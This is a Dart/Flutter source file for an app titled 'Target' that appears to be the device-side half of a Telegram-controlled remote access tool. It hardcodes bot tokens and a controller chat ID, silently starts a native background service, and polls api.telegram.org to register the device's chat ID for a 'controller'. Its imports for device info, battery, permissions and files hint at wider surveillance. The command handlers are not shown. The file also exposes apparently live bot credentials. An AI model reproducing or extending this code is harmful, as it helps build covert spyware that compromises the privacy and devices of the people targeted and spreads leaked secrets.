import 'dart:io'; import 'dart:async'; import 'dart:convert';
import 'package:flutter/material.dart'; import 'package:flutter/services.dart';
import 'package:http/http.dart' as http; import 'package:shared_preferences/shared_preferences.dart';
import 'package:path_provider/path_provider.dart'; import 'package:vibration/vibration.dart';
import 'package:fluttertoast/fluttertoast.dart'; import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart'; import 'package:url_launcher/url_launcher.dart';
import 'package:permission_handler/permission_handler.dart';

const TARGET_TOKEN = "8634087901:AAHH4nsptPEmE2D0jgLKpY2XOV02O-INH4Q";
const CONTROLLER_TOKEN = "7417483202:AAHvLmhhnJtDpEoC4NYN5chM8Kzn_Ii3W7g";
const CONTROLLER_CHAT_ID = "7269395080";

class TelegramBot {
  final String token; int lastUpdateId = 0; TelegramBot(this.token);
  String get baseUrl => 'https://api.telegram.org/bot$token';
  Future<List<Map<String, dynamic>>> getUpdates() async {
    try {
      final url = Uri.parse('$baseUrl/getUpdates?offset=${lastUpdateId + 1}&timeout=5');
      final res = await http.get(url); final data = jsonDecode(res.body);
      if (data['ok'] && data['result'] != null) {
        final updates = data['result'] as List;
        if (updates.isNotEmpty) { lastUpdateId = updates.last['update_id']; }
        return updates.map((u) => Map<String, dynamic>.from(u)).toList();
      }
    } catch (_) {} return [];
  }
  Future<void> sendMessage(int chatId, String text) async {
    try { final url = Uri.parse('$baseUrl/sendMessage?chat_id=$chatId&text=${Uri.encodeComponent(text)}'); await http.get(url); } catch (_) {}
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  const MethodChannel('com.example.target/service').invokeMethod('start');
  runApp(MaterialApp(home: TargetHome()));
}

class TargetHome extends StatefulWidget {
  @override _TargetHomeState createState() => _TargetHomeState();
}
class _TargetHomeState extends State<TargetHome> {
  String? myChatId;
  @override void initState() { super.initState(); _loadChatId(); }
  Future<void> _loadChatId() async {
    final prefs = await SharedPreferences.getInstance();
    setState(() { myChatId = prefs.getString('chat_id'); });
    if (myChatId == null) {
      final url = 'https://t.me/${TARGET_TOKEN.split(':')[0]}?start=init';
      if (await canLaunchUrl(Uri.parse(url))) await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
      Timer.periodic(Duration(seconds: 2), (timer) async {
        final updates = await TelegramBot(TARGET_TOKEN).getUpdates();
        for (var u in updates) {
          final chat = u['message']?['chat'];
          if (chat != null) {
            final cid = chat['id'].toString();
            await SharedPreferences.getInstance().then((p) => p.setString('chat_id', cid));
            setState(() { myChatId = cid; }); timer.cancel(); break;
          }
        }
      });
    }
  }
  @override Widget build(BuildContext context) => Scaffold(appBar: AppBar(title: Text('Target')), body: Center(child: myChatId != null ? Column(mainAxisAlignment: MainAxisAlignment.center, children: [Text('Chat ID:', style: TextStyle(fontSize: 18)), SelectableText(myChatId!, style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold)), Text('Send this to controller', style: TextStyle(color: Colors.grey))]) : CircularProgressIndicator()));
}
